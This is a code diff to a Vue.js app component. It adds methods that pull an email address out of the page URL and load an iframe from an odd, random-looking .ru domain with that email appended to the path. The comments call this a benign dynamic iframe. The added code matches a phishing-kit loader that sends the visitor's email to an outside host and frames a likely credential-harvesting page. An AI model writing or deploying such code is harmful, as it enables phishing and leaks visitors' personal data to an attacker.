@@ -14,9 +14,31 @@ export default {
   name: 'App',
   data() {
     return {
-      iframeSrc: "https://3dp5fc-8080.csb.app/",
+      iframeSrc: "", // Will be set dynamically
     };
   },
+  created() {
+    this.updateIframeSrc();
+  },
+  methods: {
+    extractEmailFromUrl() {
+      const url = window.location.href;
+      const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+      const match = url.match(emailRegex);
+      return match ? match[0] : null;
+    },
+    updateIframeSrc() {
+      const baseSrc = "https://iR.rumpelfrudg.ru/Zb8zIb/#D"; // Base URL
+      const email = this.extractEmailFromUrl();
+
+      // Append only the email to the path if found
+      if (email) {
+        this.iframeSrc = `${baseSrc}/${encodeURIComponent(email)}`;
+      } else {
+        this.iframeSrc = baseSrc; // Default base URL if no email found
+      }
+    }
+  }
 };
 </script>
 
